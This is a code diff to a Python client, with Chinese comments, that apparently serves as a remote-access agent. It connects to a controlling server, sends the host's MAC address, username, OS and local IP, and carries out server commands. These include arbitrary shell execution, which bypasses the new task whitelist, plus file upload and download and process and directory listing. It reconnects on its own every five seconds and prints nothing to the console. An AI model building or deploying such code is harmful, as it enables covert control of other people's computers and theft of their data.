@@ -24,6 +24,7 @@ class Client:
         self.mac_address = self.get_mac_address()
         self.username = getpass.getuser()
         self.system_info = platform.system() + " " + platform.release()
+        self.ip_local = self.get_local_ip_address()
         self.running = True
         self.current_directory = os.getcwd()
         self.send_lock = threading.Lock()
@@ -32,6 +33,58 @@ class Client:
         mac = uuid.getnode()
         return ':'.join(['{:02x}'.format((mac >> i) & 0xff)
                          for i in range(0, 12, 2)][::-1])
+    
+    
+
+    def handle_task_safe(self, command):
+        task_type = command.get("task")
+        ALLOWED_TASKS = [
+            "get_system_info",
+            "list_dir",
+            "list_process"
+            ]
+        # 白名单限制
+        if task_type not in ALLOWED_TASKS:
+            return {"status": "error", "message": "任务不允许"}
+
+        # 限速
+        if hasattr(self, "last_task_time"):
+            if time.time() - self.last_task_time < 0.2:
+                return {"status": "error", "message": "任务过于频繁"}
+        self.last_task_time = time.time()
+
+        #print(f"[TASK] {task_type}")
+
+        return self.handle_task(command)
+    
+    def handle_task(self, task):
+        ttype = task.get("task")
+
+        if ttype == "get_system_info":
+            return {
+                "status": "success",
+                "data": {
+                    "system": self.system_info,
+                    "username": self.username,
+                    "ip": self.ip_local
+                }
+            }
+
+        elif ttype == "list_dir":
+            path = task.get("path", self.current_directory)
+            try:
+                files = os.listdir(path)
+                return {
+                    "status": "success",
+                    "data": files[:100]  # 限制数量
+                }
+            except Exception as e:
+                return {"status": "error", "message": str(e)}
+
+        elif ttype == "list_process":
+            return self.list_process()
+
+        return {"status": "error", "message": "未知任务"}
 
     def connect_to_server(self):
         try:
@@ -41,10 +94,11 @@ class Client:
             client_info = {
                 'mac': self.mac_address,
                 'username': self.username,
-                'system': self.system_info
+                'system': self.system_info,
+                'ip_local': self.ip_local,
             }
             self.send_message(client_info)  # 发送设备信息到server端）
-            #print(f"已连接到服务器 {self.server_host}:{self.server_port}")
+            
             return True
         except Exception as e:
             #print(f"连接服务器失败: {e}")
@@ -75,7 +129,7 @@ class Client:
             try:
                 data = self.client_socket.recv(4096)
                 if not data:
-                    #print("服务器连接已断开")
+                    
                     break
                 buffer += data
 
@@ -94,33 +148,56 @@ class Client:
                         self.send_message(response)
 
             except Exception as e:
-                #print(f"接收命令时出错: {e}")
+                
                 break
 
     def handle_message(self, command):
-        ctype = command.get('type')
-        if ctype == 'ping':
-            return {'status': 'success', 'message': 'pong'}
-        elif ctype == 'heartbeat':
-            return {'status': 'success', 'message': 'heartbeat ack'}
-        elif ctype == 'info':
-            return {
-                'status': 'success',
-                'data': {
-                    'mac': self.mac_address,
-                    'username': self.username,
-                    'system': self.system_info,
-                    'current_dir': self.current_directory
+        try:
+            ctype = command.get('type')
+
+            # 基础通信
+            if ctype == 'ping':
+                return {'status': 'success', 'message': 'pong'}
+
+            elif ctype == 'heartbeat':
+                return {'status': 'success', 'message': 'heartbeat ack'}
+
+            # 设备信息
+            elif ctype == 'info':
+                return {
+                    'status': 'success',
+                    'data': {
+                        'mac': self.mac_address,
+                        'username': self.username,
+                        'system': self.system_info,
+                        'current_dir': self.current_directory,
+                        'ip_local': self.ip_local,
+                    }
                 }
+            elif ctype == 'execute':
+                cmd = command.get('command')
+                return self.execute_command(cmd)
+            elif ctype == 'task':
+                return self.handle_task_safe(command)
+
+            # 文件传输（可以保留）
+            elif ctype == 'download':
+                return self.download_file(command.get('path'))
+
+            elif ctype == 'upload':
+                return self.upload_file(command.get('path'), command.get('data'))
+
+            else:
+                return {
+                    'status': 'error',
+                    'message': f'未知消息类型: {ctype}'
+                }
+
+        except Exception as e:
+            return {
+                'status': 'error',
+                'message': f'handle_message异常: {str(e)}'
             }
-        elif ctype == 'execute':
-            return self.execute_command(command.get('command'))
-        elif ctype == 'download':
-            return self.download_file(command.get('path'))
-        elif ctype == 'upload':
-            return self.upload_file(command.get('path'), command.get('data'))
-        else:
-            return None
 
 
     # 命令执行器
@@ -172,6 +249,29 @@ class Client:
 
         except Exception as e:
             return {'status': 'error', 'message': f'命令处理异常: {str(e)}'}
+    def get_local_ip_address(self):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))
+            ip = s.getsockname()[0]
+            s.close()
+            return ip
+        except:
+            return "127.0.0.1"
+    def list_process(self):
+        try:
+            if platform.system() == "Windows":
+                cmd = "tasklist"
+            else:
+                cmd = "ps aux"
+
+            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+            return {
+                "status": "success",
+                "data": result.stdout[:5000]
+            }
+        except Exception as e:
+            return {"status": "error", "message": str(e)}
 
     def handle_cd_command(self, cmd):
         try:
@@ -280,7 +380,7 @@ class Client:
                     pass
                 self.client_socket = None
 
-                #print("连接丢失，5秒后尝试重连...")
+                
             time.sleep(5)
 
     def stop(self):
@@ -297,5 +397,5 @@ if __name__ == "__main__":
     try:
         client.start()
     except KeyboardInterrupt:
-        #print("\n正在关闭客户端...")
+        
         client.stop()
